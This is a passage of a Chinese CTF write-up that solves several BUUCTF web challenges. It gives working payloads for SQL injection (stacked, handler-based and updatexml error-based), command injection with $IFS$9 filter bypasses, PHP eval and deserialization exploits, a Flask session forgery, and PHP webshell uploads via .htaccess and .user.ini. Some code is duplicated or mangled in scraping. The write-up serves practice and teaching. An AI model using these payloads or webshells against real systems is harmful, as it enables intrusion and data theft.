TABLE 表名 DROP primary key\n\n7：添加主键\n\nALTER TABLE 表名 ADD CONSTRAINT 约束名 PRIMARY KEY (添加列)\n\n8：添加索引\n\nALTER TABLE 表名 ADD index 索引名 (列名);\n\n9：修改列的属性\nALTER TABLE 表名 MODIFY COLUMN 要修改属性的列名 新属性;\n\n一般情况下，不推荐在建表后对表进行大幅度修改，大幅度修改极有可能使表数据丢失。\n\n–\n看了其他大佬的wp，这里补充两种方法\n原文链接\n解题思路2：预处理绕过select限制因为select被过滤了，所以先将\nselect * from ` 1919810931114514 `\n\n进行16进制编码\n再通过构造payload得\n;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#\n\n进而得到flag\nprepare…from…是预处理语句，会进行编码转换。\nexecute用来执行由SQLPrepare创建的SQL语句。\nSELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。\n\n\n解题思路3：handler绕过payload：\n1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#\n\n\nhandler基本用法HANDLER tbl_name OPEN [ [AS] alias]\n\nHANDLER tbl_name READ index_name &#123; = | = |  &#125; (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ &#123; FIRST | NEXT &#125;\n    [ WHERE where_condition ] [LIMIT ... ]\n    \nHANDLER tbl_name CLOSE\n\n通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。\n通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。\n通过HANDLER tbl_name CLOSE来关闭打开的句柄。\n\n通过索引去查看的话可以按照一定的顺序，获取表中的数据。\n通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。\n\n通过索引列指定一个值，可以指定从哪一行开始。\n通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。\n\n\n\n句柄：【相当于一个指针，这里是指向数据库里的表】\n实例3.1 创建测试表及测试数据\n\ncreate table handler_table(  \n    c1 int,   \n    c2 varchar(10),   \n    c3 int(10) \n);  \ninsert into handler_table values(2, &#x27;name2&#x27;, 002);  \ninsert into handler_table values(5, &#x27;name5&#x27;, 005);  \ninsert into handler_table values(1, &#x27;name1&#x27;, 001);  \ninsert into handler_table values(4, &#x27;name4&#x27;, 004);  \ninsert into handler_table values(3, &#x27;name3&#x27;, 003);\n\n3.2 不通过索引打开查看表\n\n打开句柄：【相当于一个指针】\n\nmysql> handler handler_table open;\n\n查看表数据：\n\nmysql> handler handler_table read first;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    2 | name2 |    2 |\n+------+-------+------+\nmysql> handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\nmysql> handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    1 | name1 |    1 |\n+------+-------+------+\nmysql> handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql> handler handler_table read next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    3 | name3 |    3 |\n+------+-------+------+\nmysql> handler handler_table read next;\nEmpty set (0.00 sec)\n\n\n关闭句柄：\n\nmysql> handler handler_table close;\nQuery OK, 0 rows affected (0.00 sec)\n\n3.3 通过索引打开查看表（FIRST,NEXT,PREV,LAST）\n通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。\n\n创建索引：\n\nmysql> create index handler_index on handler_table(c1);\n\n打开句柄：\n\nmysql> handler handler_table open as p;\n\n查看表数据：\n\nmysql> handler p read handler_index first;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    1 | name1 |    1 |\n+------+-------+------+\nmysql> handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    2 | name2 |    2 |\n+------+-------+------+\nmysql> handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    3 | name3 |    3 |\n+------+-------+------+\nmysql> handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql> handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\nmysql> handler p read handler_index prev;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql> handler p read handler_index last;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\n\n\n\n关闭句柄：\n\nmysql> handler p close;\n\n3.4 通过索引打开查看表（=,=,）\n从index为2的地方开始\n\n打开句柄：\n\nmysql> handler handler_table open as p;\n\n查看表数据：\n\nmysql> handler p read handler_index = (2);\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    2 | name2 |    2 |\n+------+-------+------+\nmysql> handler p read handler_index next;     \n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    3 | name3 |    3 |\n+------+-------+------+\nmysql> handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    4 | name4 |    4 |\n+------+-------+------+\nmysql> handler p read handler_index next;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\nmysql> handler p read handler_index last;\n+------+-------+------+\n| c1   | c2    | c3   |\n+------+-------+------+\n|    5 | name5 |    5 |\n+------+-------+------+\n\n关闭句柄：\n\nmysql> handler p close;\n\n3.5 附加：语法实例参考\n\nhandler handler_table open;\nhandler handler_table open as p;\nhandler handler_table read first;\nhandler handler_table read next;\nhandler handler_table read first limit 3;\nhandler handler_table read next limit 3,3;\nhandler handler_table read first where c1 > 2 limit 2;\nhandler handler_table read next where c1 >2 limit 1,2;\n \ncreate index handler_index on handler_table(c1);\nhandler handler_table open;\nhandler handler_table read handler_index first;\nhandler handler_table read handler_index next limit 3;\nhandler handler_table read handler_index PREV limit 3,3;\nhandler handler_table read handler_index LAST where c1 > 2 limit 2;\nhandler handler_table read handler_index LAST where c1 > 2 limit 1,2;\nhandler handler_table read handler_index = (3);\nhandler handler_table read handler_index = (3) limit 1,2;\nhandler handler_table read handler_index  0 limit 2;\nhandler handler_table read handler_index > (1)  where c1 \n\n这里看懂以后，我自己又重新构造了一个\n1&#x27;; handler `1919810931114514` open;handler `1919810931114514` read first;\n\n效果一样，意思也差不多\n\n2.[GXYCTF2019]Ping Ping Ping1)题目描述无\n2)wp看名字应该是道命令执行的题目\n先传一个IP:123.123.123.123试试\n?ip=123.123.123.123\n\n看起来是Linux命令，先显示所有文件试试（;是顺序执行，从左往右，命令全部执行）\n?ip=123.123.123.123;ls\n\n看到flag文件，看看能不能直接读出\n\n发现，空格被过滤了，我试试了很多绕过，比如%0a，%20，%09，&lt;&gt;，但是回显都是\n?ip=123.123.123.123;cat%0aflag.php\n\n意思是符号都过滤了\n这里引入我一个新学的空格代替符$IFS$9，这是个shell中定义的环境变量，在此处可以绕过过滤\n$IFS$9（$IFS是Unix系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）\n试试\n?ip=123.123.123.123;cat$IFS$9flag.php\n\n发现flag也被过滤了，那就只好先看看index.php文件，试试能不能看到其代码\n?ip=123.123.123.123;cat$IFS$9index.php\n/?ip=\n/?ip=\n\nif(isset($_GET[&#x27;ip&#x27;]))&#123;\n  $ip = $_GET[&#x27;ip&#x27;];\n  if(preg_match(\"/\\&|\\/|\\?|\\*|\\|\\&#x27;|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match))&#123;\n    echo preg_match(\"/\\&|\\/|\\?|\\*|\\|\\&#x27;|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match);\n    die(\"fxck your symbol!\");\n  &#125; else if(preg_match(\"/ /\", $ip))&#123;\n    die(\"fxck your space!\");\n  &#125; else if(preg_match(\"/bash/\", $ip))&#123;\n    die(\"fxck your bash!\");\n  &#125; else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))&#123;\n    die(\"fxck your flag!\");\n  &#125;\n  $a = shell_exec(\"ping -c 4 \".$ip);\n  echo \"\";\n  print_r($a);\n&#125;\n\n?>\n\n\n看到ip有很多正则匹配的字符，所以没有那么容易绕过\nshell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。\nshell_exec(string $cmd): string\nexec 是 Shell 内置命令，它有两种用法，一种是执行 Shell 命令，一种是操作文件描述符\nping -c Count 指定要被发送（或接收）的回送信号请求的数目，由 Count 变量指出\n--(所以这里我们只能输入四个字符)--\n\nprint_r函数用于打印变量，以更容易理解的形式展示\n\n例子\n &#x27;apple&#x27;, &#x27;b&#x27; => &#x27;banana&#x27;, &#x27;c&#x27; => array (&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;)); \nprint_r ($a); \n?>\n输出结果\nArray\n(\n    [a] => apple\n    [b] => banana\n    [c] => Array\n        (\n            [0] => x\n            [1] => y\n            [2] => z\n        )\n\n)\n\nflag过滤语句的意思判断是否按顺序出现flag\nelse if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))\n\n所以只要ip里的flag出现不按顺序就行，也就是flag另一种方式表示\n我们看源码知道有两个变量，一个是$ip,$a\nip变量无法改变，变量a可以尝试赋值flag试试能不能绕过正则匹配，但是如果是a&#x3D;flag，就会顺序出现flag，匹配，所以试试a&#x3D;g，flag–&gt;fla$a\n?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php\n查看源码\n得到flag\n3.[MRCTF2020]你传你🐎呢1)题目描述无\n2)wp 看标题知道这是一个文件上传的题目，要求上传一个木马\n\n打开先看到一个尸体在在笑，我们先试试能不能直接上传php文件\n\n看来不行，那在试试能不能抓包修改前端文件后缀名，看看是不是前端验证，把php改成png，在抓包修改后缀为php\n\n还是一样，还有一个猜想就是MIME验证，对content-type进行了检查，可以试试使用bp抓包，修改上传的PHP的content-type为image&#x2F;png，但是还是一样的\n\n于是，可以用.htaccess实现图片马以php文件形式读取（如果不了解可以把.htaccess文件了解一下，把线下靶场upload-labs做一下）\n但是上传时，又被过滤了\n\n尝试修改文件名为.htaccess.png，然后用bp抓包修改回.htaccess，上传成功\n\n\n然后上传图片木马\n\n把路径复制一下\nhttp://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png\n\n蚁剑连接成功\n\n在根目录发现flag\n得到flag\n4.[RoarCTF 2019]Easy Calc1)题目描述无\n2)wp还是得看大佬得wp才会\n原文链接\n这是calc.php的内容，查看源码就可以看到\n\n\nerror_reporting(0);\n\nif(!isset($_GET[&#x27;num&#x27;]))&#123;\n\n  show_source(__FILE__);\n\n&#125;else&#123;\n\n    $str = $_GET[&#x27;num&#x27;];\n\n    $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;\"&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;];\n\n    foreach ($blacklist as $blackitem) &#123;\n\n        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;\n\n            die(\"what are you want to do?\");\n\n        &#125;\n\n    &#125;\n\n  eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);\n\n&#125;\n\n?>\n\nwaf主要就是看有没有非数字存在，绕过waf就好操作了\n\n1.1PHP的字符串解析特性\n这是别人对PHP字符串解析漏洞的理解，我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。\n例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。\n值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。\n例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。\n如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：\n/news.php?%20news[id%00=42\"+AND+1=0–\n\n上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。\nPHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：\n1.删除空白符\n\n2.将某些字符转换为下划线（包括空格）\n\n我的理解：假如waf不允许num变量传递字母：\nhttp://www.xxx.com/index.php?num = aaaa   //显示非法输入的话\n\n那么我们可以在num前加个空格：\nhttp://www.xxx.com/index.php? num = aaaa\n\n这样waf就找不到num这个变量了，因为现在的变量叫“（空格）num”，而不是“num”。\n但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。\n\nvar_dump() \n列举数组内容\n\nscandir() 的使用：\nscandir(directory,sorting_order,context);\n\n 返回指定目录中的文件和目录的数组,就是显示文件夹名字\n\nfile_get_contents() 的使用：\n原型：file_get_contents(path,include_path,context,start,max_length)\nfile_get_contents() 函数把整个文件读入一个字符串中。\n和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。\nfile_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。\n就是显示文件内容\n\n\nchr(47)是/的ASCII编码；【/就是根目录，可以先访问一下根目录，找找大概flag在哪里】\nchr(102)是f的ASCII编码；\nchr(49)是1的ASCII编码；\nchr(97)是a的ASCII编码；\nchr(103)是g的ASCII编码。\n【字符间用.连接，如flag-&gt;chr(102).chr(49).chr(97).chr(103)】\n根据php解析字符串的特性\n先试试返回看看根目录（&#x2F;）下的文件有哪些\nhttp://node4.buuoj.cn:29105/calc.php?num=var_dump(scandir(chr(47)))\n\n看到有个flagg\n返回看看/flagg里的内容\nhttp://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n\n5.[极客大挑战 2019]HardSQL1)题目描述无\n2)wp看名字，猜测这个sql注入过滤很严\n\n先试试fuzz测试，看看过滤了哪些，发现union被过滤，所以不能用联合注入\n\n但是发现updatexml没有被过滤，所以可以试试报错注入\n\n先构造payload\n?username=1&password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23\n【这里+被过滤了，所以这里用#】\n\n结果发现结果又被过滤了，后面用fuzz又测试了一下，发现空格也被过滤了，用%0a和其他符号也不能替换，所以只能试试()把结果框起来试试能不能绕过\n?username=1&password=1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23\n\n得到数据库名\n\n后面就是差不多了，但是要注意不能用空格，要用()框住对象\n?username=1&password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))%23\n【这里的=也被过滤了，所以用like替换】\n\n得到表名\n\n?username=1&password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%23\n\n得到列名\n\n然后看看列里数据找找flag\n?username=1&password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23\n\n看回显知道flag在password里，但为什么显示不全，是因为updatexml报错回显的数据限制最多32位，所以无法显示全flag\n\n所以可以用left和right函数进行分段显示，本来想用stustr函数，但是发现也被过滤了\n?username=1&password=1&#x27;or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1))%23\n\n为什么这里left函数显示30个字符，因为0x7e也就是也是字符，已经占了两位，所以还可以显示30位\n\n?username=1&password=1&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23\n\n\n因为是左右显示30位，所以flag内容有重叠，整理一下\n得到flag\nflag&#123;034eb054-83b5-412c-b90e-afc72c6ce998&#125;\n\n6.[网鼎杯 2020 青龙组]AreUSerialz11)题目描述\n无\n2)wp\n一道典型的序列化题目\n先对代码进行分析\n\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler &#123;\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() &#123;\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    &#125;\n\n    public function process() &#123;\n        if($this->op == \"1\") &#123;\n            $this->write();\n        &#125; else if($this->op == \"2\") &#123;\n            $res = $this->read();\n            $this->output($res);\n        &#125; else &#123;\n            $this->output(\"Bad Hacker!\");\n        &#125;\n    &#125;\n\n    private function write() &#123;\n        if(isset($this->filename) && isset($this->content)) &#123;\n            if(strlen((string)$this->content) > 100) &#123;\n                $this->output(\"Too long!\");\n                die();\n            &#125;\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        &#125; else &#123;\n            $this->output(\"Failed!\");\n        &#125;\n    &#125;\n\n    private function read() &#123;\n        $res = \"\";\n        if(isset($this->filename)) &#123;\n            $res = file_get_contents($this->filename);\n        &#125;\n        return $res;\n    &#125;\n\n    private function output($s) &#123;\n        echo \"[Result]: \";\n        echo $s;\n    &#125;\n\n    function __destruct() &#123;\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    &#125;\n\n&#125;\n\nfunction is_valid($s) &#123;\n    for($i = 0; $i strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) 125))\n            return false;\n    return true;\n&#125;\n\nif(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;\n\n    $str = (string)$_GET[&#x27;str&#x27;];\n    if(is_valid($str)) &#123;\n        $obj = unserialize($str);\n    &#125;\n\n&#125;\n\nfunction __construct(function __construct() &#123;\n    $op = \"1\";\n    $filename = \"/tmp/tmpfile\";\n    $content = \"Hello World!\";\n    $this->process();\n&#125;\n\n__construct()函数没有用，不参与序列化中\nfunction is_valid(function is_valid($s) &#123;\n    for($i = 0; $i strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) 125))\n            return false;\n    return true;\n&#125;\n//ord() 函数返回字符串中第一个字符的 ASCII 值。\n// ASCII值32为2，ASCII值125为%\n\n这个函数主要是过滤掉protect类的成员,在序列化的时候是以%00作为标识符\n*但是在PHP版本大于7.1的情况下，protect类和public类没什么好注意的，所以在构造序列化时改为public可以绕过is_valid函数\n\n\n\nfunction __destruct(function __destruct() &#123;\n    if($this->op === \"2\")\n        $this->op = \"1\";\n    $this->content = \"\";\n    $this->process();\n&#125;\n\n__destruc()函数主要是不让op===&quot;2&quot;，但是在process函数里op又要为“2”\npublic function process(public function process() &#123;\n    if($this->op == \"1\") &#123;\n        $this->write();\n    &#125; else if($this->op == \"2\") &#123;\n        $res = $this->read();\n        $this->output($res);\n    &#125; else &#123;\n        $this->output(\"Bad Hacker!\");\n    &#125;\n&#125;\n所以这里利用强弱类型比较，__destruc()函数里op是不能为2，但是是强类型比较，是字符2【”2”】,所以op&#x3D;2【数字2】，就绕过达到读取flag.php的结果\n于是构造出php序列化\n\nclass FileHandler &#123;\n    public $op=2;\n    public $filename=\"flag.php\";\n    public $content;\n&#125;\n\n$a = new FileHandler();\necho serialize($a);\n?>\n\n得到序列化结果\nO:11:\"FileHandler\":3：&#123;s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;&#125;\n\n访问，F12查看【或者改一下filename的值为php:&#x2F;&#x2F;filter伪协议，用base64，可以直接看到】\nhttp://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;\n得到flag\n\n7.[HCTF 2018]admin1)题目描述无\n2)wp这道题开始当作弱密码题解，结果直接爆破出来了\n用户名：admin\n密码：123\n这样应该最简单的方法了\n但我看了看其他大佬wp，他们把这个当作flask_session伪造的题目\n学习一下\n先注册一个试试\n用户名：admin123\n密码：123456\n\n只在change password的源码看到线索，知道是flask框架\n\n访问下载文件\nflask存在一个session伪造漏洞\nflask的session保存在客户端，一般只是加了签名来防止被截取修改，但是如果没有加密我们就可以对session进行解码来获取其中的用户数据。 \n\n如果我们在获取到签名的秘钥，就可以按照解码出来的数据进行伪造，重新生成签名的session来达到欺骗服务端。  \n\nflask的session使用base64对bytes类型的用户数据进行编码，而且编码之前可能进行了压缩(session以 \".\"  开头时表示进行了压缩) flask 保存在cookie里面的session一般格式为 data.timestamp.signature\n\n这里的session没有加密，在config.py中得到了签名秘钥ckj123，于是我们就可以重新生成session，来欺骗服务器\n\n利用cookie editor查看session值\n\n然后再找发现index.html下有flag提示\n\n简单分析一下，就是让session里的name&#x3D;&#x3D;”admin”\n所以这里就需要修改一下我们得到的session\n这里建议了解一下一个工具flask-session-cookie-manager-master能对其进行加密解码【可能需要pip下一些模块，百度可以解决】\n解密\npython flask_session_cookie_manager3.py decode -s “cxk123” -c “你在change页面的session值”\n加密\npython flask_session_cookie_manager3.py encode -s “cxk123” -t “按照得到解密结果格式改的结果”\n\n\n\n\n&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd8703c5b8b2d40b5354872c13dd4314cccf9116d2dcd65987e5f08b2d6cffdf72cb7660baeb7d5e76f3ac2465a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b35234b704019c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;\n\n把我们的用户名改为admin\n\n&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd8703c5b8b2d40b5354872c13dd4314cccf9116d2dcd65987e5f08b2d6cffdf72cb7660baeb7d5e76f3ac2465a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b35234b704019c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;\n\n然后再加密\n\n然后cookie editor修改为我们加密结果\n.eJxFUMtug0AM_JXK5xx4tBekHCKRIiqtEWgJ8l4iGkjAy1IJWlE2yr93m1bKwQd7xvbMXOF4ntq5g-hcD3O7gWPfQHSFp3eIgPhiSTYsuDMo956KRaiq3KJEQ9xpFR-6LFEDmfwZ7c6SPfRZkq4qzhfi0vF-528sJDpuboUsmAI0mdx_o8lXlaBGLl-yuBmwouVvV7EySis-rRSkITItZF4H4kZjVYbus6VKrBiTT1L7rl9EQFu4beA0T-fj54dux4cFq0OsUifFVZKGwkkTcuBMFp2T0otEOWvFgPbkOTkdVWWQ7bb3c72pL-3jUuhC-EfG2jgA6sb0I2zga26ne27ge3D7AeD4b34.YwOoDA.quyfjg-Miz9Y5cx6i5hTVr0EWjE\n\n\n得到flag\n8.[ZJCTF 2019]NiZhuanSiWei1)题目描述无\n2)wp先分析一下\n    \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,&#x27;r&#x27;)===\"welcome to the zjctf\"))&#123;\n    echo \"\".file_get_contents($text,&#x27;r&#x27;).\"\";\n    if(preg_match(\"/flag/\",$file))&#123;\n        echo \"Not now!\";\n        exit(); \n    &#125;else&#123;\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    &#125;\n&#125;\nelse&#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n第一个\nif(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;)if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;)//r为读取权限\n\nfile_get_contents()函数是将文件内容读取到变量，而这里是从变量读取，读取text变量的值，这里需要text变量为welcome to the zjctf\n但是因为可能存在对变量的正则匹配，过滤，一般是用base64绕过\n这里就可以利用两个伪协议，php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;，这两个一个是读取post数据，一个是读取get数据，这里用data:&#x2F;&#x2F;协议\n?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=\n\n当然这里不用base64也可以\n?text=data://text/plain;welcome to the zjctf\n\n第二个\ninclude($file);  include($file);  //useless.php\n\n一个文件包含，尝试用php:&#x2F;&#x2F;filter读取useless.php\n&file=php://filter/read=conver.base64-encode/resource=useless.php\n\n至于password，猜测应该是在useless.php里才有线索，先赋值1看看\n于是先构造一个payload\n?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php&password=1\n\n得到useless.php内容\n\nPD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo\n\n解码后\n\n  \n\nclass Flag&#123;  //flag.php  \n    public $file;  \n    public function __tostring()&#123;  \n        if(isset($this->file))&#123;  \n            echo file_get_contents($this->file); \n            echo \"\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        &#125;  \n    &#125;  \n&#125;  \n?>\n\n再看看password变量\n$password = unserialize($password = unserialize($password);\n    echo $password;\n这里用了反序列化，所以password就是序列化后的值\n利用useless.php构造序列化\n  \n\nclass Flag&#123; \n    public $file=\"flag.php\" ;  \n    public function __tostring()&#123;  \n        if(isset($this->file))&#123;  \n            echo file_get_contents($this->file); \n            echo \"\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        &#125;  \n    &#125;  \n&#125;  \n$password = new Flag();\necho serialize($password);\n?>\n\n运行后        \nO:4:\"Flag\":1:&#123;s:4:\"file\";s:8:\"flag.php\";&#125;\n\n最后payload\n?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:\"Flag\":1:&#123;s:4:\"file\";s:8:\"flag.php\";&#125;\n\n//仔细一下会注意到这里的file的值中，伪协议删除了，\n这是因为开始默认都是index.php，但是index.php没有Flag类，\n如果想执行反序列化，那就需要包含Flag类，也就是这里的useless.php里的\n所以这里删除file里的伪协议，只留useless.php的文件名\n就是利用  include($file); \n把useless.php包含在index.php里，从而可以成功执行反序列化，得到flag\n\n得到flag\n9.[SUCTF 2019]CheckIn1)题目描述无\n2)wp先上传一个文本文件试试\n\nexif_imagetype是判断一个图像的类型的进程。\n\n所以只能上传图片\n先上传一个包含PHP木马的图片马试试\n\n看来是过滤了&lt;?，所以除了php,其他的asp,aspx,jsp,js都可以绕过\n这里以js举例\n创建一个js文件，内容为\n&lt;script language=&quot;php&quot;&gt;@eval($_POST[&lt;script language=&quot;php&quot;&gt;@eval($_POST[\"cmd\"]);\n\n在和一个普通图片合成，也可以加个文件头GIF89a\n图片马名为haha.gif\n然后上传\n\n由于不是php木马，所以无法用.htaccess文件绕过\n这里就需要用.user.ini配置文件,当然使用前提是.user.ini文件下有php文件，不然也不能包含了\n推荐看一下这篇文章\n在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。\n 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。\n 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。\nauto_append_file、auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 \n\n使用方法很简单，直接写在.user.ini中：\n\n所以这里设置自动包含的文件为haha.gif\n于是.user.ini内容为\nGIF89a       //绕过图片判断         